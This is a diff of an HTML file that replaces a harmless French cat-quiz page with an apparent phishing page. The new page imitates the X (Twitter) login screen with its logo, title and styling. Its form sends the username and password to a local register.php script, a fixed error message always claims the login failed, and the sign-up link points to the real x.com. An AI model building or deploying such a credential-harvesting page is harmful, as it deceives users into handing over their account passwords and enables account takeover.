@@ -1,169 +1,181 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="fr">
+  <link rel="icon" type="image/svg+xml" href="x.png" />
+
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>CatCatch — Découvre ton chat</title>
-<link rel="icon" type="image/svg+xml" href="logo.png" />
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <title>Connexion — X</title>
+  <meta name="description" content="Recréation originale de l'interface de connexion de X (non officielle)." />
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700;800&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --bg:#07090b; --card:#0c1116; --muted:#96a3b3; --text:#e6edf3;
-    --grad: linear-gradient(135deg,#1d9bf0,#7c3aed);
-  }
-  *{box-sizing:border-box}
-  body{
-    margin:0; min-height:100svh; display:grid; place-items:center;
-    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial;
-    background: radial-gradient(1200px 800px at 70% -10%, #151a20 10%, transparent 60%) , var(--bg);
-    color:var(--text);
-  }
-  .wrap{ width:min(680px,92vw); text-align:center; }
-  h1{ font-weight:800; letter-spacing:.2px; margin:0 0 10px; }
-  p.lead{ color:var(--muted); margin:0 0 28px; }
+  <style>
+    :root{
+      --bg: #000000;
+      --text: #e7e9ea;
+      --muted: #8b98a5;
+      --panel: #0a0a0a;
+      --input-bg: #16181c;
+      --input-border: #2f3336;
+      --input-border-focus: #3b82f6;
+      --primary: #1d9bf0;
+      --primary-hover: #1a8cd8;
+      --danger: #f4212e;
+      --radius: 16px;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; }
+    body{
+      margin:0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    a{ color: var(--primary); text-decoration: none; }
+    a:hover{ text-decoration: underline; }
 
-  /* Card */
-  .card{
-    background:linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0)) , var(--card);
-    border:1px solid #1b2430; border-radius:22px; padding:28px;
-    box-shadow:0 10px 40px rgba(0,0,0,.35);
-  }
+    .shell{
+      min-height: 100svh;
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: clamp(24px, 5vw, 64px);
+      align-items: center;
+      padding: clamp(16px, 4vw, 48px);
+    }
+    @media (max-width: 1024px){
+      .shell{ grid-template-columns: 1fr; }
+      .brand{ justify-self: center; }
+    }
 
-  /* Loader */
-  .loader{
-    display:inline-grid; place-items:center; gap:14px; padding:24px 10px;
-    min-height:160px;
-  }
-  .spin{
-    width:64px; height:64px; border-radius:50%;
-    border:6px solid rgba(255,255,255,.12);
-    border-top-color:#fff; animation:spin 1s linear infinite;
-    filter:drop-shadow(0 0 14px rgba(124,58,237,.35));
-  }
-  @keyframes spin{ to { transform:rotate(360deg) } }
-  .hint{ color:var(--muted); font-size:.95rem }
+    .brand{
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: clamp(12px, 2vw, 24px);
+    }
+    .brand svg{
+      width: min(48vw, 520px);
+      height: auto;
+      display: block;
+      filter: drop-shadow(0 10px 30px rgba(255,255,255,0.06));
+    }
 
-  /* Result */
-  .result{ display:none; animation:pop .5s ease forwards }
-  @keyframes pop{ from{ transform:translateY(6px); opacity:.0 } to{ transform:none; opacity:1 } }
+    .panel{ max-width: 460px; width: 100%; justify-self: center; }
+    .panel h1{ font-size: clamp(28px, 4vw, 42px); line-height: 1.15; margin: 0 0 24px; }
 
-  .badge{
-    display:inline-block; padding:6px 12px; border-radius:999px;
-    background:var(--grad); color:white; font-weight:700; letter-spacing:.3px;
-    margin-bottom:12px;
-  }
-  .cat-emoji{ font-size:62px; margin:6px 0 10px }
-  .cat-name{ font-size:1.8rem; font-weight:800; margin:6px 0 4px }
-  .cat-desc{ color:var(--muted); margin:0 0 18px }
+    .btn{
+      display: inline-flex; align-items: center; justify-content: center;
+      gap: 10px;
+      width: 100%;
+      border-radius: 9999px;
+      padding: 14px 18px;
+      border: 1px solid var(--input-border);
+      background: transparent;
+      color: var(--text);
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform .04s ease, background .2s ease, border-color .2s ease;
+    }
+    .btn:hover{ background: #0b0b0b; border-color: #3a3a3a; }
+    .btn:active{ transform: translateY(1px); }
+    .btn .icon{ width: 20px; height: 20px; display: inline-block; }
 
-  .actions{ display:flex; justify-content:center; gap:12px; flex-wrap:wrap }
-  .btn{
-    appearance:none; border:0; cursor:pointer; font-weight:700;
-    padding:12px 18px; border-radius:999px; transition:.18s ease;
-  }
-  .btn-primary{ background:var(--grad); color:#fff }
-  .btn-primary:hover{ filter:brightness(1.05); transform:translateY(-1px) }
-  .btn-ghost{ background:transparent; color:#c9d4e2; border:1px solid #2a3442 }
-  .btn-ghost:hover{ background:#121821 }
+    .divider{ display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; gap: 12px; margin: 10px 0 6px; color: var(--muted); }
+    .divider::before, .divider::after{ content: ""; height: 1px; background: var(--input-border); }
 
-  /* floating cats bg */
-  .bg-cats{ position:fixed; inset:0; pointer-events:none; opacity:.14; overflow:hidden }
-  .bg-cats span{ position:absolute; font-size:40px; animation:float 12s linear infinite }
-  @keyframes float{ from{ transform:translateY(110%)} to{ transform:translateY(-20%)} }
-</style>
+    form{ display: grid; gap: 14px; margin-top: 8px; }
+    label{ font-size: 14px; color: var(--muted); }
+    .field{ position: relative; }
+    .input{
+      width: 100%;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      color: var(--text);
+      padding: 14px 16px;
+      border-radius: 10px;
+      outline: none;
+      transition: border-color .2s ease, box-shadow .2s ease;
+    }
+    .input::placeholder{ color: #98a2ad; }
+    .input:focus{
+      border-color: var(--input-border-focus);
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.22);
+    }
+
+    .forgot{ justify-self: start; font-size: 14px; }
+
+    .submit{
+      background: var(--primary);
+      border-color: transparent;
+      color: white;
+      font-weight: 700;
+    }
+    .submit:hover{ background: var(--primary-hover); }
+    .submit:disabled{ opacity: .6; cursor: not-allowed; }
+
+    .hint{ color: var(--muted); font-size: 14px; }
+    .signup{ margin-top: 22px; padding: 16px; border: 1px solid var(--input-border); border-radius: var(--radius); background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.00)); }
+
+    footer{ margin-top: 28px; color: var(--muted); font-size: 12px; line-height: 1.4; }
+
+    .error {
+      margin-top: 16px;
+      padding: 12px 16px;
+      background: rgba(244, 33, 46, 0.15);
+      border: 1px solid var(--danger);
+      border-radius: 8px;
+      color: var(--danger);
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    @media (prefers-reduced-motion: reduce){
+      .btn{ transition: background .2s ease, border-color .2s ease; }
+    }
+  </style>
 </head>
 <body>
-  <!-- Fun background -->
-  <div class="bg-cats" aria-hidden="true">
-    <span style="left:8%; animation-delay:0s">🐱</span>
-    <span style="left:24%; animation-delay:2s">😺</span>
-    <span style="left:42%; animation-delay:1s">🐈</span>
-    <span style="left:64%; animation-delay:3s">😻</span>
-    <span style="left:82%; animation-delay:1.6s">🐾</span>
-  </div>
+  <main class="shell" role="main">
+    <section class="brand" aria-label="Identité visuelle">
+      <svg viewBox="0 0 100 100" aria-hidden="true" focusable="false">
+        <defs>
+          <linearGradient id="g" x1="0" x2="1" y1="0" y2="1">
+            <stop offset="0%" stop-color="#ffffff" stop-opacity="0.95"/>
+            <stop offset="100%" stop-color="#9ca3af" stop-opacity="0.9"/>
+          </linearGradient>
+        </defs>
+        <rect x="45" y="-15" width="10" height="130" rx="4" transform="rotate(45 50 50)" fill="url(#g)"/>
+        <rect x="45" y="-15" width="10" height="130" rx="4" transform="rotate(-45 50 50)" fill="url(#g)"/>
+      </svg>
+    </section>
 
-  <main class="wrap">
-    <h1>CatChat</h1>
-    <p class="lead">On scanne tes vibes… prépare-toi à rencontrer ton alter-chat 🐈‍⬛</p>
+    <section class="panel" aria-label="Connexion">
+      <h1>Se connecter</h1>
 
-    <section class="card" aria-live="polite">
-      <!-- Loader -->
-      <div class="loader" id="loader">
-        <div class="spin" role="status" aria-label="Chargement"></div>
-        <div class="hint">Analyse féline en cours (≈ 3 secondes)…</div>
-      </div>
-
-      <!-- Result -->
-      <div class="result" id="result">
-        <div class="badge">Ton totem félin</div>
-        <div class="cat-emoji" id="catEmoji">😺</div>
-        <div class="cat-name" id="catName">Chat Solaire</div>
-        <p class="cat-desc" id="catDesc">Optimiste, curieux et toujours partant pour une sieste au soleil.</p>
-
-        <div class="actions">
-          <button class="btn btn-primary" id="againBtn">Rejouer</button>
-          <button class="btn btn-ghost" id="shareBtn">Copier le résultat</button>
+      <form action="register.php" method="post" novalidate aria-label="Formulaire de connexion">
+        <div class="field">
+          <input class="input" id="id" name="id" type="text" autocomplete="username" placeholder="Numéro de téléphone, e-mail ou nom d’utilisateur" required />
         </div>
+        <div class="field">
+          <input class="input" id="password" name="password" type="password" autocomplete="current-password" placeholder="Mot de passe" required />
+        </div>
+        <a class="forgot" href="#">Mot de passe oublié ?</a>
+        <button class="btn submit" type="submit">Se connecter</button>
+      </form>
+
+      <!-- Message d'erreur -->
+      <div class="error" role="alert">
+        L'adresse mail ou le mot de passe saisis sont invalides.
       </div>
+
+      <div class="signup" aria-live="polite">
+        <p class="hint">Vous n’avez pas de compte ? <a href="https://x.com">Inscrivez-vous</a></p>
+      </div>
+
+      <footer></footer>
     </section>
   </main>
-
-<script>
-  // Liste des profils de chats
-  const CATS = [
-    { name: "Chat Solaire", emoji:"😺", desc:"Optimiste, curieux et toujours partant pour une sieste au soleil." },
-    { name: "Ninja de Canapé", emoji:"🐱‍👤", desc:"Silencieux, furtif… surtout quand il s’agit d’éviter les tâches ménagères." },
-    { name: "Chat Roi/Renne", emoji:"😼", desc:"Chic, exigeant, accepte les caresses… sur rendez-vous uniquement." },
-    { name: "Tornade Poilue", emoji:"🐈", desc:"Énergie infinie, zoomies à 3h du matin, cœur tendre." },
-    { name: "Philosophe Ronron", emoji:"🐱", desc:"Regarde la pluie en méditant sur le sens du thon." },
-    { name: "Hacker de Croquettes", emoji:"😸", desc:"Trouve toujours une technique pour ouvrir le placard interdit." },
-    { name: "Chat Nuage", emoji:"😻", desc:"Câlin, moelleux, météo intérieure : 100% ronron." },
-    { name: "Explorateur du Frigo", emoji:"😹", desc:"Audacieux, intrépide, surtout quand la porte s’ouvre." }
-  ];
-
-  const loader = document.getElementById('loader');
-  const result = document.getElementById('result');
-  const catEmoji = document.getElementById('catEmoji');
-  const catName  = document.getElementById('catName');
-  const catDesc  = document.getElementById('catDesc');
-  const againBtn = document.getElementById('againBtn');
-  const shareBtn = document.getElementById('shareBtn');
-
-  function pickRandomCat(){
-    return CATS[Math.floor(Math.random() * CATS.length)];
-  }
-
-  function showResult(){
-    const c = pickRandomCat();
-    catEmoji.textContent = c.emoji;
-    catName.textContent  = c.name;
-    catDesc.textContent  = c.desc;
-    loader.style.display = 'none';
-    result.style.display = 'block';
-  }
-
-  // Première charge : 3 secondes de “scan”
-  setTimeout(showResult, 3000);
-
-  // Rejouer : on remet le loader 3s puis on révèle
-  againBtn.addEventListener('click', () => {
-    result.style.display = 'none';
-    loader.style.display = 'inline-grid';
-    setTimeout(showResult, 3000);
-  });
-
-  // Copier le résultat
-  shareBtn.addEventListener('click', async () => {
-    const text = `Mon totem félin : ${catName.textContent} ${catEmoji.textContent} — ${catDesc.textContent} #ChatPulse`;
-    try{
-      await navigator.clipboard.writeText(text);
-      shareBtn.textContent = "Copié !";
-      setTimeout(()=>shareBtn.textContent="Copier le résultat", 1500);
-    }catch(e){
-      alert("Impossible de copier, désolé :(");
-    }
-  });
-</script>
 </body>
 </html>
